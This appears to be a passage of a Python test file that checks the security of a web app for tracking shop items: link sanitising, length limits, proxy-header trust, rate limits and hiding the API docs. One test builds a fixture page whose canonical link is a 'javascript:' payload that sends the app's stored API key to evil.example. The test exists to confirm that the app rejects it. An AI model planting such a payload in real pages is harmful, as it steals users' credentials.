        with pytest.raises(RuntimeError, match="too easy to guess"):
            with TestClient(main.app):
                pass


def test_a_page_cannot_plant_a_javascript_link_or_image(client):
    """A page decides its own canonical address and image. Only web addresses
    may be saved: "javascript:" would run code in the app if clicked."""
    page = """<html><head><title>Nice Lamp</title>
    <link rel="canonical" href="javascript:fetch('https://evil.example/?k='+localStorage.getItem('ontrack.apiKey'))">
    <meta property="og:title" content="Nice Lamp"><meta property="og:image" content="javascript:alert(1)">
    <script type="application/ld+json">{"@type":"Product","name":"Nice Lamp","offers":{"price":"499"}}</script>
    </head></html>"""
    r = client.post("/items/from-html", data={"url": "https://www.savana.com/details/9"},
                    files={"html": ("p.html", page, "text/html")}, headers=H)
    link = r.json()["links"][0]
    assert link["url"].startswith("https://") and link["image"] is None


def test_text_fields_have_length_limits(client):
    r = client.post("/items", json={"name": "x" * 301, "price": 1}, headers=H)
    assert r.status_code == 422
    r = client.post("/items", json={"name": "Lamp", "price": 1, "note": "n" * 2001}, headers=H)
    assert r.status_code == 422


def test_made_up_forwarded_addresses_dont_escape_the_rate_limit(monkeypatch):
    """Behind Railway's proxy, only the LAST X-Forwarded-For entry (written by
    the proxy) counts. A sender can't pose as many addresses by inventing the rest."""
    monkeypatch.setattr(main, "TRUST_PROXY", True)
    scope = lambda xff: {"client": ("10.0.0.1", 1), "headers": [(b"x-forwarded-for", xff)]}
    assert main.client_address(scope(b"1.1.1.1, 203.0.113.9")) == "203.0.113.9"
    assert main.client_address(scope(b"2.2.2.2, 203.0.113.9")) == "203.0.113.9"
    monkeypatch.setattr(main, "TRUST_PROXY", False)                 # not behind a proxy: header ignored
    assert main.client_address(scope(b"1.1.1.1")) == "10.0.0.1"


def test_page_downloads_have_a_limit_for_everyone_together(client, monkeypatch):
    """Even from many different addresses, the server downloads at most
    RATE_LIMIT_HEAVY_TOTAL pages a minute."""
    monkeypatch.setattr(main, "TRUST_PROXY", True)
    monkeypatch.setattr(main, "RATE_LIMIT_HEAVY_TOTAL", 3)
    codes = [client.post("/refresh", headers={**H, "X-Forwarded-For": f"198.51.100.{i}"}).status_code
             for i in range(4)]
    assert codes == [200, 200, 200, 429]


def test_docs_can_be_turned_off(monkeypatch):
    import importlib
    monkeypatch.setenv("ONTRACK_DOCS", "off")
    hidden = importlib.reload(main)
    try:
        assert hidden.app.docs_url is None and hidden.app.openapi_url is None
    finally:
        monkeypatch.setenv("ONTRACK_DOCS", "on")
        importlib.reload(main)
